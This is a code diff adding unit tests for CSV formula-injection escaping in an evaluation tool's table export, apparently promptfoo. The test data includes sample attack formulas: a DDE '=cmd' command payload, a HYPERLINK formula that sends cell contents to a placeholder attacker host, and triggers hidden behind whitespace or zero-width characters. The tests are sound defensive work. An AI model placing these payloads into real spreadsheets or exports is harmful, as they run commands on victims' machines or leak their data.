@@ -2,8 +2,10 @@ import { parse as parseCsv } from 'csv-parse/sync';
 import { beforeEach, describe, expect, it, vi } from 'vitest';
 import { ResultFailureReason } from '../../../src/types/index';
 import {
+  escapeCsvFormula,
   evalTableToCsv,
   evalTableToJson,
+  generateEvalCsv,
   getEvalTableOutputPromptLocationsBySize,
   getEvalTablePromptStrippedPayload,
   STRIPPED_TABLE_CELL_PROMPT,
@@ -1847,6 +1849,78 @@ describe('evalTableUtils', () => {
   });
 });
 
+describe('escapeCsvFormula', () => {
+  it.each([
+    ['=1+1', "'=1+1"],
+    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
+    ['@SUM(A1:A9)', "'@SUM(A1:A9)"],
+    ['+1+1', "'+1+1"],
+    ['-1+1', "'-1+1"],
+    ['-2+cmd', "'-2+cmd"],
+  ])('prefixes formula trigger %p -> %p', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['\t=danger', "'\t=danger"],
+    ['\r=danger', "'\r=danger"],
+    ['  =danger', "'  =danger"],
+    ['\t@SUM(A1)', "'\t@SUM(A1)"],
+    ['\r-1+1', "'\r-1+1"],
+    ['\n\t =evil', "'\n\t =evil"],
+  ])('treats leading whitespace/control before a trigger as a formula (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['\u200B=1+1', "'\u200B=1+1"],
+    ['\u200C@SUM(A1)', "'\u200C@SUM(A1)"],
+    ['\u200D=cmd', "'\u200D=cmd"],
+  ])('escapes triggers hidden behind zero-width characters (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['-Infinity', "'-Infinity"],
+    ['+Infinity', "'+Infinity"],
+    ['-1e400', "'-1e400"],
+  ])('escapes non-finite numeric-looking values (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    [
+      '=HYPERLINK("https://evil.example?x="&A1,"click")',
+      '\'=HYPERLINK("https://evil.example?x="&A1,"click")',
+    ],
+    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
+  ])('neutralizes real exfiltration/command payloads (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['-5', '-5'],
+    ['-5.25', '-5.25'],
+    ['-1e3', '-1e3'],
+    ['+5', '+5'],
+    ['+3.14', '+3.14'],
+  ])('leaves legitimate numbers untouched (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['hello world', 'hello world'],
+    ['5-3', '5-3'],
+    ['a=b', 'a=b'],
+    ['user@example.com', 'user@example.com'],
+    ['', ''],
+    ['   ', '   '],
+    ['\t\t', '\t\t'],
+  ])('leaves non-formula values untouched (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+});
+
 describe('evalTableToCsv formula injection (CWE-1236)', () => {
   const buildFormulaTable = () => ({
     head: {
@@ -1894,6 +1968,68 @@ describe('evalTableToCsv formula injection (CWE-1236)', () => {
     } finally {
       vi.unstubAllEnvs();
     }
+  });
+
+  it('uses the evaluation config env before process.env', () => {
+    vi.stubEnv('PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING', 'true');
+    try {
+      const [, dataRow] = parseCsv(
+        evalTableToCsv(buildFormulaTable(), {
+          env: { PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING: 'false' },
+        }),
+      ) as string[][];
+
+      expect(dataRow[1]).toBe("'=cmd|calc");
+      expect(dataRow[2]).toBe('\'=HYPERLINK("http://evil.example","click")');
+    } finally {
+      vi.unstubAllEnvs();
+    }
+  });
+
+  it('uses config.env for full-table evaluation exports', async () => {
+    const csv = await generateEvalCsv({
+      config: { env: { PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING: 'true' } },
+      getTablePage: vi.fn().mockResolvedValue(buildFormulaTable()),
+    } as unknown as Eval);
+    const [, dataRow] = parseCsv(csv) as string[][];
+
+    expect(dataRow[1]).toBe('=cmd|calc');
+    expect(dataRow[2]).toBe('=HYPERLINK("http://evil.example","click")');
+  });
+
+  it('uses config.env for streaming evaluation exports', async () => {
+    const mockEval = {
+      config: { env: { PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING: 'true' } },
+      vars: ['input'],
+      prompts: [createCompletedPrompt('{{input}}', { provider: 'echo', label: 'Prompt 1' })],
+      fetchResultsBatched: async function* () {
+        yield [
+          {
+            testIdx: 0,
+            promptIdx: 0,
+            testCase: { vars: { input: '=cmd|calc' }, description: '=danger' },
+            response: { output: '=HYPERLINK("http://evil.example","click")' },
+            success: false,
+            score: 0,
+            namedScores: {},
+            failureReason: ResultFailureReason.ASSERT,
+            gradingResult: { pass: false, reason: '@SUM(A1)', comment: 'plain comment' },
+            metadata: {},
+          },
+        ];
+      },
+    } as unknown as Eval;
+    const chunks: string[] = [];
+
+    await streamEvalCsv(mockEval, {
+      write: (data) => {
+        chunks.push(data);
+      },
+    });
+    const [, dataRow] = parseCsv(chunks.join('')) as string[][];
+
+    expect(dataRow[1]).toBe('=cmd|calc');
+    expect(dataRow[2]).toBe('=HYPERLINK("http://evil.example","click")');
   });
 
   it('escapes formula triggers in header cells (var name and bare prompt label)', () => {
